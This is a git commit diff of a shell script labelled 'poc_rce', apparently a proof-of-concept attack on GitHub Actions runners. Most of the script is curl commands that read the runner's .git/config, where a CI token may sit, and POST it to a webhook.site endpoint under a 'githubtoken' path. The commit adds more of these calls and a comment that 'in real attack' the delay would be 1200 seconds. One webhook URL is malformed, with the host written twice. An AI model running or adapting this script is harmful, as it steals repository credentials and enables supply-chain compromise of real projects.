671c2596a0ded623ed3ff5e0e980020dbf24ea31
Barak Haryati <barakhr25@gmail.com>
2025-12-18 23:42:40 +0200

    Update myscript.sh

--- myscript.sh
+++ myscript.sh
@@ -3,11 +3,18 @@ echo -------------poc_rce-------------- >&2
 
 
 
-export webhook="https://webhook.site/605c679f-5fed-4164-93b6-5d1eb4a6a352"
+export webhook="https://webhook.site/https://webhook.site/0adc90cc-a61d-4cda-b4f5-c4bc887c7336"
+export repo=barakharyati/QGIS-fork
 
 curl -X POST \
   -H "Content-Type: text/plain" \
-  --data "$(cat /home/runner/work/beam/beam/.git/config)" \
+  --data "$(cat /home/runner/work/${repo}/.git/config)" \
+    "$webhook/githubtoken"
+
+
+curl -X POST \
+  -H "Content-Type: text/plain" \
+  --data "$(cat /home/runner/work/${repo}/.git/config)" \
     "$webhook/githubtoken"
 
 curl -X POST \
@@ -24,9 +31,9 @@ curl -X POST \
 
 curl -X POST \
   -H "Content-Type: text/plain" \
-  --data "$(cat /home/runner/work/beam/beam/.git/config)" \
+  --data "$(cat /home/runner/work/${repo}/.git/config)" \
   "$webhook/githubtoken"
 
 
 git config --list >&2
-sleep 60
+sleep 2 # in real attack it will be 1200 to have time to edit 
